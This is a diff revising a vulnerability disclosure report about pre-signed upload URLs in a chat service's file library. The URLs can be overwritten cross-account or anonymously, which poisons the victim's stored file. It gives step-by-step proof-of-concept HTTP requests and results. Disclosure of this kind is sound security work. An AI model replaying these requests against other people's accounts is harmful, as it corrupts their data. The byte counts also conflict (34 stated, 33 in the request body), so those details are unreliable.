@@ -57,9 +57,9 @@ Integrity-only: no confidentiality impact (cross-account reads → 404) and no o
    `{"intended_use_case":"my_files","entry_surface":"context_connector_upload","requires_gizmo_id":false,"store_in_library":true,"library_persistence_mode":"required"}`
    → 200 with `reservation_id: file_…` and `upload_url: https://sdmntp…oaiusercontent.com/files/…/raw?se=…&sp=w&sv=2026-02-06&sr=b&scid=…&sig=…`
 2. **B** uploads legitimate content: `PUT <upload_url>` (headers `Content-Type: text/plain`, `x-ms-blob-type: BlockBlob`), body `SYNTHETIC-B-FIRST legitimate content` → **201**
-3. **A (different account, different session)** PUTs to the **same URL**: body `SYNTHETIC-A-INJECTED by account A` (33 bytes) → **201**
+3. **A (different account, different session)** PUTs to the **same URL**: body `SYNTHETIC-A-INJECTED by account A` (34 bytes: 33 chars + trailing newline — single consistent value used in every step and in the evidence file) → **201**
    *(Also succeeds with **no cookies at all** → 201, and B re-PUT → 201.)*
-4. **B** claims her own reservation with the **true blob size (33 bytes — compute it with `wc -c` on your payload)**:
+4. **B** claims her own reservation declaring the **exact blob size (34 bytes — `wc -c` on the payload file)**:
    `POST /backend-api/files/upload_reservations/{reservation_id}/claim_and_finish`
    body: `{"file_name":"SYNTHETIC-B-CLAIMED-R3.txt","file_size":33,"use_case":"my_files","index_for_retrieval":false,"store_in_library":true,"library_persistence_mode":"required"}`
    → 200 `{"file_id":"file_…","event":"file.processing.started",…}`
@@ -68,9 +68,26 @@ Integrity-only: no confidentiality impact (cross-account reads → 404) and no o
 6. **Ground truth**: B downloads her own file via `GET /backend-api/files/library/files/{libfile}/content_url` → `content_url` → GET → **200 "SYNTHETIC-A-INJECTED by account A"**
 7. **Control**: from A, detail + content_url of B's file → **404** both (no cross-account read, no ownership transfer).
 
+**PoC at a glance (15-second table):**
+
+| Step | Identity | Action | Result |
+| ---- | -------- | ------ | ------ |
+| 1 | B | Create reservation | `200` + SAS |
+| 2 | B | PUT legitimate | `201` |
+| 3 | A | PUT same SAS | `201` |
+| 4 | Anonymous | PUT same SAS | `201` |
+| 5 | B | Claim (exact size) | `200` |
+| 6 | B | Download own file | **A's bytes** |
+
 ## Impact
 
-An attacker with the victim's `upload_url` (valid ~5 min) replaces the content of the victim's pending upload; the victim's claim flow then materializes attacker-chosen bytes in the victim's library — where the file can be attached to messages, shared publicly, used by a custom GPT/agent, or exported. Stored-content poisoning / data-integrity violation against the victim's account. Realistic leak vectors: the SPA PUTs directly to `*.oaiusercontent.com`, so the URL transits HTTP proxies, browser history, server/extension logs and screenshot tooling. Scale note (honest): today exploitation is one file per leaked URL; it would scale to mass poisoning only if a future endpoint ever listed reservations — nothing observed today.
+**Proven (demonstrated end-to-end between two self-owned accounts):** anyone possessing the victim's `upload_url` (valid ~5 min) can replace the pending blob — including cross-account and unauthenticated — and the victim's own claim flow then materializes the attacker's bytes in the victim's library file, where it can be attached to messages, shared publicly, used by a custom GPT/agent, or exported. Stored-content poisoning / data-integrity violation. Race rounds 2026-09-21 (both orders) confirm last-writer-wins: whoever PUTs last before the claim decides the bytes.
+
+**Explicitly NOT claimed:** this report does not demonstrate a remote path for an attacker to obtain an arbitrary victim's `upload_url` through the tested API (no reservation enumeration, no ID prediction, no cross-account read observed). The severity below assumes URL possession as precondition.
+
+Possible exposure channels (secondary, not the basis of impact): the SPA PUTs directly to `*.oaiusercontent.com`, so a leaked URL could additionally transit HTTP proxies, browser history, server/extension logs or screenshot tooling. The core defect stands without them: **the server mints a write capability that is not cryptographically or logically bound to the requesting context, and storage honors it with no authentication or identity check.**
+
+Scale note (honest): today exploitation is one file per leaked URL; it would scale to mass poisoning only if a future endpoint ever listed reservations — nothing observed today.
 
 No confidentiality impact and no ownership transfer (verified) — hence LOW, integrity-only.
 
